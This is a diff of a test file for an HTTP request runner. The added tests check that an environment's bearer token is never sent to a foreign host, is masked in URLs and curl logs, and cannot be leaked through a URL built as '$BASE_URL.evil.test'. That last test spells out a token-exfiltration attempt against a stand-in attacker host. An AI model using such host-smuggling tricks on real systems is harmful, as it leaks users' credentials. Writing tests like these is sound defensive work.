@@ -188,7 +188,7 @@ describe('runHttpRequest like the tab shell', () => {
     writeFileSync(fake, `#!/bin/sh\nprintf '%s\\n' "$@" > '${argsFile}'\nexit 7\n`)
     chmodSync(fake, 0o755)
     try {
-      const res = await runHttpRequest(spec({ url: '/x', headers: 'Authorization: Bearer $TOKEN' }), env(), { curl: fake })
+      const res = await runHttpRequest(spec({ url: '/x?k=$TOKEN', headers: 'Authorization: Bearer $TOKEN' }), env(), { curl: fake })
       expect(res.status).toBe(0)
       const args = readFileSync(argsFile, 'utf8')
       expect(args).not.toContain('tok-123')
@@ -323,7 +323,47 @@ describe('runHttpRequest with the structured form', () => {
   })
 })
 
+describe('the token stays with the environment', () => {
+  const foreign = (): string => `http://localhost:${new URL(base).port}/echo`
+
+  it('refuses to send it to another host from any field', async () => {
+    await expect(runHttpRequest(spec({ url: foreign(), headers: 'Authorization: Bearer $TOKEN' }), env())).rejects.toThrow('sent only to')
+    await expect(runHttpRequest(spec({ url: `${foreign()}?k=$TOKEN` }), env())).rejects.toThrow('sent only to')
+    await expect(runHttpRequest(spec({ url: foreign(), auth: { type: 'bearer', token: '$TOKEN' } }), env())).rejects.toThrow('sent only to')
+    await expect(runHttpRequest(spec({ url: foreign(), auth: { type: 'basic', username: 'a', password: '$TOKEN' } }), env())).rejects.toThrow('sent only to')
+    await expect(runHttpRequest(spec({ url: foreign(), auth: { type: 'apikey', name: 'k', value: '$TOKEN', in: 'query' } }), env())).rejects.toThrow('sent only to')
+  })
+
+  it('cannot be smuggled out by a host built from $BASE_URL', async () => {
+    const bare = env({ baseUrl: 'http://example.test' })
+    await expect(runHttpRequest(spec({ url: '$BASE_URL.evil.test/x', headers: 'Authorization: Bearer $TOKEN' }), bare)).rejects.toThrow('sent only to')
+  })
+
+  it('does not come back to the interface in the URL, redirects or the timeline', async () => {
+    const encoded = env({ token: 'a/b+c=' })
+    const query = await runHttpRequest(spec({ url: '/echo', auth: { type: 'apikey', name: 'key', value: '$TOKEN', in: 'query' } }), encoded)
+    expect(query.status).toBe(201)
+    expect(echo(query.body).url).toBe(`/api/echo?key=${encodeURIComponent('a/b+c=')}`)
+    expect(query.url).toContain('key=••••')
+    expect(query.url).not.toContain('a%2Fb')
+    expect(query.timeline).not.toContain('a%2Fb')
+    const plain = await runHttpRequest(spec({ url: '/echo?k=$TOKEN' }), env())
+    expect(plain.url).not.toContain('tok-123')
+    expect(plain.timeline).not.toContain('tok-123')
+  })
+})
+
 describe('redactTimeline', () => {
+  it('masks credentials in curl\'s HTTP/2 lines too', () => {
+    const log = ['* [HTTP/2] [1] [:method: GET]', '* [HTTP/2] [1] [authorization: Basic dXNlcjpzZWtyZXQ=]', '* [HTTP/2] [1] [x-key: abc]', '* [HTTP/2] [1] [accept: */*]'].join('\n')
+    expect(redactTimeline(log, ['X-Key'], undefined).split('\n')).toEqual([
+      '* [HTTP/2] [1] [:method: GET]',
+      '* [HTTP/2] [1] [authorization: ••••]',
+      '* [HTTP/2] [1] [x-key: ••••]',
+      '* [HTTP/2] [1] [accept: */*]'
+    ])
+  })
+
   it('keeps the log lines, masks credentials and the token anywhere', () => {
     const log = ['* Connected', '> GET /?k=sekret HTTP/1.1', '> X-Key: value', '> Cookie: a=1', '> Accept: */*', '{ [5 bytes data]', '< HTTP/1.1 200 OK', 'curl: (0) noise'].join('\r\n')
     expect(redactTimeline(log, ['X-Key'], 'sekret').split('\n')).toEqual([
